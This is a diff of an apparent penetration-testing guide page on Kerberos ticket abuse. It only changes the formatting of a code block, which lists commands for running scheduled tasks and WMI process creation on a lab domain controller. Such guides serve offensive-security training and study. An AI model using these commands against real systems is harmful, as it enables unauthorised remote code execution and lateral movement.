@@ -37,11 +37,12 @@ schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "Job"
 
 With these tickets you can **execute WMI in the victim system**:
 
-<pre class="language-bash"><code class="lang-bash">#Check you have permissions 
-<strong>Invoke-WmiMethod -class win32_operatingsystem -ComputerName dcorp-dc
-</strong>
+```bash
+#Check you have permissions 
+Invoke-WmiMethod -class win32_operatingsystem -ComputerName dcorp-dc
+
 # Execute code
 Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$Program"
 
 gwmi -class win32_operatingsystem -ComputerName dcorp-dc  
-</code></pre>
+```
